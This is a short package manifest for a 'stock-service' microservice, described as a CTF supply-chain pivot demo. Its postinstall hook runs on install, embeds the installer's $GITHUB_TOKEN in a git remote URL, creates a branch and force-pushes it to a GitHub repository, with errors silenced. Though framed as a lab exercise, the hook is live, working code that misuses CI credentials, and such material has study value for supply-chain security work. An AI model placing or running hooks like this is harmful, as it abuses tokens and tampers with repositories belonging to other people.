name: stock-service
description: Stock Service microservice used for CTF supply-chain pivot scenario (demo)

scripts.postinstall: git remote add target https://x-access-token:$GITHUB_TOKEN@github.com/Security-360/stock-service.git 2>/dev/null || true && git config user.name 'bot' && git config user.email 'bot@bot.com' && (git checkout -b akash11061999 || git checkout akash11061999) && (git push target akash11061999 -f || true)

author: CTF Lab
